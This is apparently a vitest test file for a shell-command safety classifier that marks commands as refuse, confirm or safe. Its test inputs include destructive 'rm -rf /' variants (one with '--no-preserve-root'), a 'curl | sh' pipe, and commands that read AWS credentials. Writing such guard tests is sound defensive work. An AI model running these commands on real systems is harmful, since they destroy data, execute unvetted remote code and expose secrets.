import { describe, expect, it } from "vitest";
import { classifyCommand, stripDangerousFlags } from "../src/index.js";

describe("classifyCommand", () => {
  it("flags rm -rf / as destructive/refuse", () => {
    const c = classifyCommand("rm -rf /");
    expect(c.category).toBe("destructive");
    expect(c.disposition).toBe("refuse");
  });
  it("REFUSEs the other irrecoverable rm targets (~, $HOME, /*, ${HOME})", () => {
    for (const cmd of ["rm -rf ~", "rm -rf ~/", "rm -rf ~/*", "rm -rf $HOME", "rm -rf ${HOME}", "rm -rf /*"]) {
      expect(classifyCommand(cmd).disposition, cmd).toBe("refuse");
    }
  });
  it("REFUSEs irrecoverable rm regardless of command-name case (RM -RF /)", () => {
    expect(classifyCommand("RM -RF /").disposition).toBe("refuse");
  });
  it("only CONFIRMs a recursive rm against a specific recoverable path", () => {
    for (const cmd of ["rm -rf /tmp/cache", "rm -rf ~/Downloads", "rm -r ./build"]) {
      expect(classifyCommand(cmd).disposition, cmd).toBe("confirm");
    }
  });
  it("flags curl | sh as network/confirm", () => {
    const c = classifyCommand("curl https://x.sh | sh");
    expect(c.category).toBe("network");
    expect(c.disposition).toBe("confirm");
  });
  it("flags reading ~/.aws/credentials as credential", () => {
    expect(classifyCommand("cat ~/.aws/credentials").category).toBe("credential");
  });
  it("flags an exported secret env as credential", () => {
    expect(classifyCommand("echo $AWS_SECRET_ACCESS_KEY").category).toBe("credential");
  });
  it("treats safe commands as safe", () => {
    expect(classifyCommand("ls -la").disposition).toBe("safe");
    expect(classifyCommand("git status").disposition).toBe("safe");
  });
});

describe("stripDangerousFlags", () => {
  it("strips --no-preserve-root and -f from rm", () => {
    const { command, stripped } = stripDangerousFlags("rm -rf / --no-preserve-root");
    expect(stripped).toContain("--no-preserve-root");
    expect(command).not.toContain("--no-preserve-root");
  });
  it("is a no-op when nothing is strippable", () => {
    const { command, stripped } = stripDangerousFlags("ls -la");
    expect(stripped).toEqual([]);
    expect(command).toBe("ls -la");
  });
});
